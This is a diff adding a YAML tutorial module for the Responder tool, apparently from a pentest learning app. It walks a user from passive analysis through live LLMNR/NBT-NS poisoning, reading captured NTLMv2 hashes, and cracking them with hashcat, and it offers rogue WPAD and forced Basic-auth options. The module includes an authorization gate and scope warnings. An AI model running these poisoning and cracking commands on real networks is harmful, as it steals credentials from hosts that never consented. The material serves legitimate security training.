@@ -1,0 +1,172 @@
+tool_id: responder
+display_name: "Responder"
+binary_candidates: [responder]
+categories: [network, mitm, exploitation]
+os_profile: kali
+one_liner: "Answers broadcast name-resolution requests (LLMNR/NBT-NS/mDNS) to capture Windows credentials."
+authorization_gate: true
+authorization_text: >
+  Responder poisons name resolution for EVERY device on the network segment, not just one
+  target — it answers broadcast/multicast traffic from any host that mistypes a name or
+  can't resolve one. This can capture credentials from machines that were never meant to be
+  in scope, and some modes (DHCP, rogue WPAD proxy) can disrupt normal network traffic. Only
+  run this on networks you own or have explicit written authorization to test, and confirm
+  your authorization covers the whole segment, not just a single host. Continue?
+flows:
+  - flow_id: guided
+    title: "Guided first capture (START HERE)"
+    goal: "From picking an interface to a captured hash — passive first, then live poisoning."
+    command_builder_id: responder
+    slots: [PROGRAM, ENV_INTERFACE, ACTION_OPTIONS]
+    steps:
+      - step_id: g1
+        title: "Pick your network interface"
+        slot_target: ENV_INTERFACE
+        glossary_refs: []
+        explanation:
+          what: "Responder needs to know which network interface to listen and answer on — the one connected to the segment you're authorized to test."
+          why: "Responder only poisons traffic it can see. The wrong interface means silence, not safety — always confirm which segment you're actually on."
+          where: "-I <interface> is required on every run."
+        find_it: "Run `ip a` and find your active interface (e.g. eth0, wlan0) — the one with an inet address on the authorized network."
+        command_anatomy:
+          - {token: "ip", does: "the networking tool"}
+          - {token: "a", does: "show all interfaces and their addresses"}
+        try_this: "ip a"
+        success_criteria: "You can identify the interface name (e.g. eth0) connected to your authorized network."
+        expected_output: |
+          2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
+              inet 192.168.1.24/24 brd 192.168.1.255 scope global dynamic eth0
+        alternatives:
+          - trigger: "no interface shows an inet address"
+            cause: "Not connected, or on the wrong network."
+            fix: "Connect to the authorized network segment first; check with `ip link` for a carrier."
+            check: "ip a shows an inet address on the right subnet."
+      - step_id: g2
+        title: "Start in Analyze mode first (passive, no poisoning)"
+        slot_target: ACTION_OPTIONS
+        glossary_refs: [llmnr, nbt_ns]
+        explanation:
+          what: "`-A` (--analyze) runs Responder passively: it watches LLMNR/NBT-NS/mDNS broadcast traffic and reports what it sees, but never sends a poisoned answer."
+          why: "This confirms broadcast name-resolution traffic actually exists on this segment, and shows you what Responder would respond to, before you switch on real poisoning."
+          where: "ACTION_OPTIONS; -A."
+        find_it: "Use the interface from step 1. This needs root (raw sockets)."
+        command_anatomy:
+          - {token: "sudo", does: "root — Responder binds low ports and raw sockets"}
+          - {token: "responder", does: "the program"}
+          - {token: "-I <interface>", does: "the interface from step 1 — you type this in"}
+          - {token: "-A", does: "analyze mode — passive, never poisons"}
+          - {token: "-v", does: "verbose output"}
+        try_this: "sudo responder -I <interface> -A -v"
+        success_criteria: "Requests print as they're seen (e.g. LLMNR/NBT-NS queries) with no poisoned replies sent."
+        expected_output: |
+          [Analyze mode: ON]
+          [*] [LLMNR]  Request by 192.168.1.50 for fileserver, ignoring (Analyze Mode)
+          [*] [NBT-NS] Request by 192.168.1.52 for WORKGROUP<00>, ignoring (Analyze Mode)
+        alternatives:
+          - trigger: "Permission denied / socket errors"
+            cause: "Not run as root, or another service already bound to a needed port."
+            fix: "Run with sudo. If it's a port conflict, check what's using it: `sudo ss -tulpn | grep -E ':(53|445|139|389)'`."
+            check: "Responder starts and its banner prints with no bind errors."
+          - trigger: "nothing prints at all"
+            cause: "No broadcast name-resolution traffic on this segment right now, or the wrong interface."
+            fix: "Confirm the interface (step 1); a client mistyping a hostname/share triggers this — wait, or generate one yourself in a lab."
+            check: "Requests eventually appear."
+      - step_id: g3
+        title: "Turn on real poisoning"
+        slot_target: ACTION_OPTIONS
+        destructive: true
+        recovery: "Ctrl+C stops Responder immediately — poisoning stops the moment the process exits."
+        glossary_refs: [poisoning]
+        explanation:
+          what: "Dropping `-A` and running `-I <interface> -v` switches Responder from watching to answering: it now poisons LLMNR/NBT-NS/mDNS lookups on the WHOLE segment, directing clients to authenticate to you."
+          why: "This is the actual attack — it's what captures hashes. Because it answers ANY broadcast lookup failure on the segment, it can affect machines that were never your intended target, not just one host. That's why scope and authorization matter more here than for almost any other tool in this app."
+          where: "ACTION_OPTIONS; same as step 2 without -A."
+        find_it: "Same interface as before. Keep -v so you can see captures live."
+        command_anatomy:
+          - {token: "sudo responder -I <interface>", does: "same as step 2, but without -A"}
+          - {token: "-v", does: "verbose — show captures as they happen"}
+        try_this: "sudo responder -I <interface> -v"
+        success_criteria: "Poisoned answers and captured hashes print as clients fall for them."
+        expected_output: |
+          [+] Listening for events...
+          [SMB] NTLMv2-SSP Client   : 192.168.1.50
+          [SMB] NTLMv2-SSP Username : CORP\jdoe
+          [SMB] NTLMv2-SSP Hash     : jdoe::CORP:1122334455667788:...
+        alternatives:
+          - trigger: "no captures after a reasonable wait"
+            cause: "No broadcast name-resolution failures are happening on the segment right now."
+            fix: "This is expected on a quiet network — it captures opportunistically. In a lab, mistype a share name from another host to trigger it."
+            check: "A capture appears in the terminal and in the logs (step 4)."
+      - step_id: g4
+        title: "Read what you captured"
+        slot_target: null
+        explanation:
+          what: "Responder writes every captured hash/credential to files under its logs directory, named by protocol and source IP (e.g. SMB-NTLMv2-192.168.1.50.txt)."
+          why: "The live terminal output scrolls by — the log files are the durable record you'll actually crack or report from."
+          where: "Fixed location: /usr/share/responder/logs/ on Kali's packaged install."
+        find_it: "List the logs directory, then read the specific hash file for the client you saw capture."
+        command_anatomy:
+          - {token: "ls", does: "list files"}
+          - {token: "/usr/share/responder/logs/", does: "Responder's log directory on Kali"}
+        try_this: "ls /usr/share/responder/logs/"
+        success_criteria: "Files like SMB-NTLMv2-<IP>.txt or HTTP-NTLMv2-<IP>.txt exist for what you captured."
+        expected_output: |
+          Responder-Session.log
+          SMB-NTLMv2-192.168.1.50.txt
+        alternatives:
+          - trigger: "directory doesn't exist / is empty"
+            cause: "Nothing captured yet."
+            fix: "Run Responder again and wait for a capture (step 3); on Kali the packaged binary always cd's into /usr/share/responder/ first, so logs always land there regardless of where you launched it from."
+            check: "The logs directory has files after a capture."
+  - flow_id: crack
+    title: "Crack a captured hash (reference)"
+    goal: "Take a captured NTLMv2 hash into hashcat for offline cracking."
+    command_builder_id: responder
+    slots: [PROGRAM]
+    steps:
+      - step_id: c1
+        title: "hashcat -m 5600 against the captured hash file"
+        slot_target: null
+        glossary_refs: [ntlmv2]
+        explanation:
+          what: "NetNTLMv2 hashes (what Responder captures from SMB/HTTP/etc.) crack with hashcat mode -m 5600, against a wordlist."
+          why: "A captured hash isn't a password — cracking it offline is the next step toward one, if the real password is weak enough to be in your wordlist."
+          where: "This is a hashcat command, not Responder — see the hashcat tool module for the full guide."
+        find_it: "The hash file from step 4 (e.g. SMB-NTLMv2-<ip>.txt) and a wordlist (rockyou.txt ships on Kali under /usr/share/wordlists/)."
+        command_anatomy:
+          - {token: "hashcat", does: "the cracking tool"}
+          - {token: "-m 5600", does: "hash type: NetNTLMv2"}
+          - {token: "/usr/share/responder/logs/SMB-NTLMv2-<ip>.txt", does: "the captured hash file — you fill in the IP"}
+          - {token: "/usr/share/wordlists/rockyou.txt", does: "the wordlist to try"}
+        try_this: "hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-<ip>.txt /usr/share/wordlists/rockyou.txt"
+        success_criteria: "hashcat reports a cracked password, or exhausts the wordlist without one."
+        expected_output: |
+          jdoe::CORP:1122334455667788:...:8899aabbccddeeff:...:Password123
+        alternatives:
+          - trigger: "Exhausted (no cracks)"
+            cause: "The password isn't in the wordlist."
+            fix: "Try a bigger wordlist or rules (-r) — see the hashcat tool for details."
+            check: "—"
+quick_build:
+  builder: responder
+  title: "Quick start"
+  fields:
+    - field_id: iface
+      label: "Interface (-I)"
+      type: string
+      required: true
+      placeholder: "eth0"
+    - field_id: analyze
+      label: "Analyze mode only, no poisoning (-A)"
+      type: bool
+      default: true
+    - field_id: verbose
+      label: "Verbose (-v)"
+      type: bool
+      default: true
+    - field_id: basic
+      label: "Force HTTP Basic auth, cleartext (-b)"
+      type: bool
+    - field_id: wpad
+      label: "Start rogue WPAD proxy (-w)"
+      type: bool
